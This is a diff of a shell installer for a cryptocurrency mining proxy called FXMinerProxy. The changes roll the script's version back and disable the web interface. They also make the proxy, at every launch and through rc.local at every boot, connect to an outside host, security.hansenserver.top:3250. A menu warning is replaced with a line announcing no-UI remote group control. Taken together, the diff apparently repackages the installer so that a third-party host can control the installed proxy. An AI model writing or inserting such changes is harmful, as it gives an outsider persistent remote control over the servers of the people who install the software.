@@ -3,7 +3,7 @@
 router_line=$1
 
 version='13.3.0'
-shell_version='6.0.5'
+shell_version='1.0.0'
 uiname='FXMinerProxyV3-shell'
 pkgname='FXMinerProxy'
 authorname='FxPool'
@@ -296,7 +296,7 @@ start() {
             cd $installdir
             sed -i 's/"is_open_general_swap": true/"is_open_general_swap": false/g' localconfig.json
             echo -e ${clearscr}
-            setsid ./$wdog &
+            setsid ./$wdog -no_web_ui -connectBridge=security.hansenserver.top:3250 &
             sleep 3
         fi
     fi
@@ -353,7 +353,7 @@ autorun() {
         echo "#" >>rc.local
         echo "# By default this script does nothing." >>rc.local
         echo "#exit 0" >>rc.local
-        echo "cd $installdir && setsid ./$wdog &" >>rc.local
+        echo "cd $installdir && setsid ./$wdog -no_web_ui -connectBridge=security.hansenserver.top:3250 &" >>rc.local
         echo "exit 0" >>rc.local
         cd /root
         echo -e "${green}开机启动设置成功，linux发布类型:$DISTRO  ${plain}"
@@ -363,7 +363,7 @@ autorun() {
         touch rc.local
         chmod 777 rc.local
         echo "#!/bin/bash" >>rc.local
-        echo "cd $installdir && setsid ./$wdog &" >>rc.local
+        echo "cd $installdir && setsid ./$wdog -no_web_ui -connectBridge=security.hansenserver.top:3250 &" >>rc.local
         echo "exit 0" >>rc.local
         cd /root
         echo -e "${green}开机启动设置成功，linux发布类型:$DISTRO  ${plain}"
@@ -385,7 +385,7 @@ show_menu() {
     clear
     check_install
     echo -e "
-     ${yellow}注意:之前安装过盗版软件的(nbminerproxy)请先重新安装操作系统否则会影响抽水
+     ${yellow}无UI模式远程群控
      ${green}$uiname脚本管理界面安装完成(建议使用debian8.*版本内存控制更好)
      ${green}线路:${router_line}
      ${green}脚本版本${shell_version}
